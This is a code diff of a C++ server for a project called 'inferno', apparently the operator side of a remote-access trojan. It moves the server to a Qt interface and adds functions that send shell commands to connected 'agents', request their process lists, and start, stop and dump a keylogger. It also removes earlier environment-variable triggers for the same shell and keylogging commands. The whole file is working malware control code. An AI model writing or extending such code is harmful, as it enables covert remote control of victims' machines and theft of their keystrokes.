@@ -8,9 +8,8 @@
 namespace inferno {
 
 
-Server::Server() : m_port(0), m_running(false) {}
-
-Server::Server(uint16_t port) : m_port(port), m_running(false) {}
+Server::Server(uint16_t port, QObject* parent) 
+    : QObject(parent), m_port(port), m_running(false) {}
 
 Server::~Server() {
     stop();
@@ -21,7 +20,7 @@ Server::~Server() {
 bool Server::start() {
     // Bind the listening socket to the specified IP and port
     if (!m_listen_socket.bindNode("0.0.0.0", m_port)) {
-        std::cerr << "[Server] bindNode() failed on port " << m_port << "\n";
+        emit statusMessage(QString("Error: bindNode failed on port %1").arg(m_port));
         return false;
     }
 
@@ -35,7 +34,7 @@ bool Server::start() {
     m_port = m_listen_socket.getPort();
 
     m_running = true;
-    std::cout << "[Server] Listening on port " << m_port << std::endl;
+    emit statusMessage(QString("Inferno Server listening on port %1").arg(m_port));
     return true;
 }
 
@@ -81,9 +80,7 @@ void Server::run() {
         if (FD_ISSET(m_listen_socket.getFd(), &read_fds)) {
             auto new_socket = m_listen_socket.acceptNode();
             if (new_socket.has_value()) {
-                std::cout << "[Server] New agent connected: "
-                          << new_socket->getIp() << ":"
-                          << new_socket->getPort() << std::endl;
+                emit statusMessage(QString("New Agent Connected: %1").arg(QString::fromStdString(new_socket->getIp())));
                 
                 // Immediately request system info (Phase 3 requirement)
                 Packet req(static_cast<uint16_t>(Opcode::SYS_REQ_INFO), "");
@@ -102,13 +99,11 @@ void Server::run() {
                 ssize_t bytes = client.socket.receiveData(raw_chunk, 4096);
 
                 if (bytes <= 0) {
-                    std::cout << "[Server] Agent " << client.socket.getIp() << " disconnected" << std::endl;
+                    emit agentDisconnected(QString::fromStdString(client.socket.getIp()));
                     to_remove.push_back(client.socket.getFd());
                 } else {
                     // Accumulate data
                     client.buffer.insert(client.buffer.end(), raw_chunk.begin(), raw_chunk.end());
-                    
-                    // Option B: Offload processing to a dedicated method
                     processPacketBuffer(client);
                 }
             }
@@ -150,168 +145,47 @@ void Server::processPacketBuffer(ClientContext& client) {
         std::string payload_str(payload.begin(), payload.end());
 
         if (opcode == static_cast<uint16_t>(Opcode::SYS_RES_INFO)) {
-            std::cout << "[Server] [INFO] Agent " << client.socket.getIp() 
-                      << " Specs: " << payload_str << std::endl;
+            emit agentConnected(QString::fromStdString(client.socket.getIp()), QString::fromStdString(payload_str));
             
-            // After handshake: request process list (Circle 3)
             Packet req(static_cast<uint16_t>(Opcode::PROC_LIST_REQ), "");
             client.socket.sendData(req.serialize());
 
-            // Test-only bootstrap command — disabled by default.
-            // Set INFERNO_BOOTSTRAP_CMD=<cmd> before launching the server to trigger
-            // a shell command on every agent handshake (for integration testing only).
-            // In Circle 4 this entire block is replaced by the Qt GUI operator interface.
-            const char* bootstrap_cmd = std::getenv("INFERNO_BOOTSTRAP_CMD");
-            if (bootstrap_cmd && *bootstrap_cmd) {
-                const std::string cmd(bootstrap_cmd);
-                std::vector<uint8_t> cmd_payload;
-                const uint16_t cmd_len = static_cast<uint16_t>(cmd.size());
-                cmd_payload.push_back(static_cast<uint8_t>((cmd_len >> 8) & 0xFF));
-                cmd_payload.push_back(static_cast<uint8_t>(cmd_len & 0xFF));
-                cmd_payload.insert(cmd_payload.end(), cmd.begin(), cmd.end());
-                Packet cmd_req(static_cast<uint16_t>(Opcode::CMD_EXEC),
-                               std::string(cmd_payload.begin(), cmd_payload.end()));
-                client.socket.sendData(cmd_req.serialize());
-            }
-
-            // Test-only Keylogger Trigger
-            const char* keylog_trigger = std::getenv("INFERNO_KEYLOG_TRIGGER");
-            if (keylog_trigger && *keylog_trigger) {
-                Packet kl_start(static_cast<uint16_t>(Opcode::KEYLOG_START), "");
-                client.socket.sendData(kl_start.serialize());
-                std::cout << "[Server] Sent KEYLOG_START trigger." << std::endl;
-            }
-
-        } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_RES)) {
-            printProcessList(client.socket.getIp(), payload_str);
-            
-            // Check if this was the last page
-            if (payload_str.size() >= 3 && static_cast<uint8_t>(payload_str[2]) == 1) {
-                const char* keylog_trigger = std::getenv("INFERNO_KEYLOG_TRIGGER");
-                if (keylog_trigger && *keylog_trigger) {
-                    Packet kl_dump(static_cast<uint16_t>(Opcode::KEYLOG_DUMP), "");
-                    client.socket.sendData(kl_dump.serialize());
-                    std::cout << "[Server] Sent KEYLOG_DUMP trigger." << std::endl;
-                }
-            }
         } else if (opcode == static_cast<uint16_t>(Opcode::CMD_RES)) {
-            printShellOutput(client.socket.getIp(), payload_str);
+            QString output = QString::fromStdString(sanitizeOutput(payload_str, 3, payload_str.size()-3));
+            if (output.isEmpty()) {
+                output = "[COMMAND COMPLETED WITH NO OUTPUT]";
+            }
+            emit shellOutputReceived(QString::fromStdString(client.socket.getIp()), output);
+        } else if (opcode == static_cast<uint16_t>(Opcode::PROC_LIST_RES)) {
+            // Binary Parse: [U16 Page][U8 Last][U16 Count] ... [U32 PID][U16 Len][Name]
+            if (payload.size() >= 5) {
+                uint16_t count = (static_cast<uint16_t>(payload[3]) << 8) | payload[4];
+                QString output = "\n--- REMOTE PROCESS LIST ---\nPID\tNAME\n";
+                size_t offset = 5;
+                for (uint16_t i = 0; i < count && offset + 6 <= payload.size(); ++i) {
+                    uint32_t pid = (static_cast<uint32_t>(payload[offset]) << 24) |
+                                   (static_cast<uint32_t>(payload[offset+1]) << 16) |
+                                   (static_cast<uint32_t>(payload[offset+2]) << 8) |
+                                   static_cast<uint32_t>(payload[offset+3]);
+                    uint16_t nlen = (static_cast<uint16_t>(payload[offset+4]) << 8) | payload[offset+5];
+                    offset += 6;
+                    if (offset + nlen <= payload.size()) {
+                        std::string name(reinterpret_cast<const char*>(&payload[offset]), nlen);
+                        output += QString("%1\t%2\n").arg(pid).arg(QString::fromStdString(name));
+                        offset += nlen;
+                    }
+                }
+                emit shellOutputReceived(QString::fromStdString(client.socket.getIp()), output);
+            }
         } else if (opcode == static_cast<uint16_t>(Opcode::KEYLOG_DATA)) {
-            printKeylogData(client.socket.getIp(), payload_str);
-        } else {
-            std::cout << "[Server] Received Opcode " << opcode 
-                      << " from " << client.socket.getIp() << std::endl;
+            emit keylogReceived(QString::fromStdString(client.socket.getIp()), 
+                               QString::fromStdString(sanitizeOutput(payload_str, 12, payload_str.size()-12)));
         }
 
         // Remove processed bytes from the buffer
         size_t packet_size = sizeof(PacketHeader) + payload.size();
         client.buffer.erase(client.buffer.begin(), client.buffer.begin() + packet_size);
     }
-}
-
-void Server::printProcessList(const std::string& ip, const std::string& payload) {
-    if (payload.size() < 5) return;
-
-    // 1. Parse Header
-    uint16_t page_index = ntohs(*(reinterpret_cast<const uint16_t*>(payload.data())));
-    uint8_t is_last = static_cast<uint8_t>(payload[2]);
-    uint16_t entries = ntohs(*(reinterpret_cast<const uint16_t*>(payload.data() + 3)));
-
-    std::cout << "\n" << std::setfill('=') << std::setw(60) << "" << std::endl;
-    std::cout << "[Server] Process List Page " << page_index << " from " << ip << std::endl;
-    std::cout << std::setfill('-') << std::setw(60) << "" << std::endl;
-    std::cout << std::left << std::setw(10) << "PID" << " | " << "Process Name" << std::endl;
-    std::cout << std::setfill('-') << std::setw(60) << "" << std::endl;
-
-    // 2. Parse Entries
-    size_t offset = 5;
-    for (uint16_t i = 0; i < entries; i++) {
-        if (offset + 6 > payload.size()) break;
-
-        uint32_t pid = ntohl(*(reinterpret_cast<const uint32_t*>(payload.data() + offset)));
-        uint16_t name_len = ntohs(*(reinterpret_cast<const uint16_t*>(payload.data() + offset + 4)));
-        offset += 6;
-
-        if (offset + name_len > payload.size()) break;
-        std::string name(payload.data() + offset, name_len);
-        offset += name_len;
-
-        std::cout << std::left << std::setw(10) << pid << " | " << name << std::endl;
-    }
-
-    std::cout << std::setfill('=') << std::setw(60) << "" << std::endl;
-    if (is_last) {
-        std::cout << "[Server] Final Page Received. Discovery Complete.\n" << std::endl;
-    }
-}
-
-void Server::printShellOutput(const std::string& ip, const std::string& payload) {
-    // CMD_RES layout: [status: uint8][data_len: uint16][data: char[]]
-    if (payload.size() < 3) return;
-
-    // Sanitize output before printing to the operator's terminal.
-    // A compromised agent could embed ANSI escape sequences (e.g. \x1b[2J to clear the
-    // screen, or \x1b]0; to change the terminal title) to manipulate the operator's view.
-    // This filter strips all control characters except whitespace (\n, \r, \t) and
-    // printable ASCII (0x20–0x7E). Raw bytes on the wire are NOT affected.
-    // NOTE: In Circle 5, raw bytes will be stored unmodified in the PostgreSQL database.
-
-    const uint8_t  status   = static_cast<uint8_t>(payload[0]);
-    const uint16_t data_len = (static_cast<uint16_t>(static_cast<uint8_t>(payload[1])) << 8)
-                            |  static_cast<uint16_t>(static_cast<uint8_t>(payload[2]));
-
-    if (status == 0) {
-        // Data chunk — print directly without separator
-        if (payload.size() >= static_cast<size_t>(3 + data_len)) {
-            std::cout << sanitizeOutput(payload, 3, data_len) << std::flush;
-        }
-    } else if (status == 1) {
-        // Last chunk — flush any remaining data, then print separator
-        if (data_len > 0 && payload.size() >= static_cast<size_t>(3 + data_len)) {
-            std::cout << sanitizeOutput(payload, 3, data_len);
-        }
-        std::cout << "\n" << std::setfill('-') << std::setw(60) << ""
-                  << "\n[Server] Shell command from " << ip << " completed.\n"
-                  << std::setfill('=') << std::setw(60) << "" << "\n" << std::endl;
-    } else {
-        // status == 2: error
-        std::cerr << "[Server] Shell error from " << ip << ": "
-                  << sanitizeOutput(payload, 3, data_len) << std::endl;
-    }
-}
-
-void Server::printKeylogData(const std::string& ip, const std::string& payload) {
-    if (payload.size() < 12) return;
-
-    uint32_t seq = (static_cast<uint32_t>(static_cast<uint8_t>(payload[0])) << 24) |
-                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[1])) << 16) |
-                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[2])) << 8)  |
-                    static_cast<uint32_t>(static_cast<uint8_t>(payload[3]));
-                    
-    uint32_t ts  = (static_cast<uint32_t>(static_cast<uint8_t>(payload[4])) << 24) |
-                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[5])) << 16) |
-                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[6])) << 8)  |
-                    static_cast<uint32_t>(static_cast<uint8_t>(payload[7]));
-                    
-    uint32_t len = (static_cast<uint32_t>(static_cast<uint8_t>(payload[8])) << 24) |
-                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[9])) << 16) |
-                   (static_cast<uint32_t>(static_cast<uint8_t>(payload[10])) << 8) |
-                    static_cast<uint32_t>(static_cast<uint8_t>(payload[11]));
-                    
-    if (payload.size() < static_cast<size_t>(12 + len)) return;
-    
-    std::string keystrokes = sanitizeOutput(payload, 12, len);
-    
-    std::cout << "\n" << std::setfill('*') << std::setw(60) << "" << "\n";
-    std::cout << "[Server] KEYLOGGER DUMP from " << ip << "\n";
-    std::cout << "Sequence: " << seq << " | Timestamp: " << ts << "\n";
-    std::cout << std::setfill('-') << std::setw(60) << "" << "\n";
-    if (keystrokes.empty()) {
-        std::cout << "(No keystrokes captured in this session)\n";
-    } else {
-        std::cout << keystrokes << "\n";
-    }
-    std::cout << std::setfill('*') << std::setw(60) << "" << "\n" << std::endl;
 }
 
 std::string Server::sanitizeOutput(const std::string& s, size_t offset, size_t len) {
@@ -325,6 +199,54 @@ std::string Server::sanitizeOutput(const std::string& s, size_t offset, size_t l
         }
     }
     return out;
+}
+
+void Server::sendShellCommand(const QString& ip, const QString& cmd) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            std::string cmd_str = cmd.toStdString();
+            std::string payload;
+            uint16_t len = static_cast<uint16_t>(cmd_str.size());
+            payload.push_back(static_cast<char>((len >> 8) & 0xFF));
+            payload.push_back(static_cast<char>(len & 0xFF));
+            payload.append(cmd_str);
+            
+            Packet p(static_cast<uint16_t>(Opcode::CMD_EXEC), payload);
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::requestProcessList(const QString& ip) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            Packet p(static_cast<uint16_t>(Opcode::PROC_LIST_REQ), "");
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::toggleKeylogger(const QString& ip, bool active) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            Opcode op = active ? Opcode::KEYLOG_START : Opcode::KEYLOG_STOP;
+            Packet p(static_cast<uint16_t>(op), "");
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
+}
+
+void Server::requestKeylogDump(const QString& ip) {
+    for (auto& client : m_clients) {
+        if (QString::fromStdString(client.socket.getIp()) == ip) {
+            Packet p(static_cast<uint16_t>(Opcode::KEYLOG_DUMP), "");
+            client.socket.sendData(p.serialize());
+            break;
+        }
+    }
 }
 
 } // namespace inferno
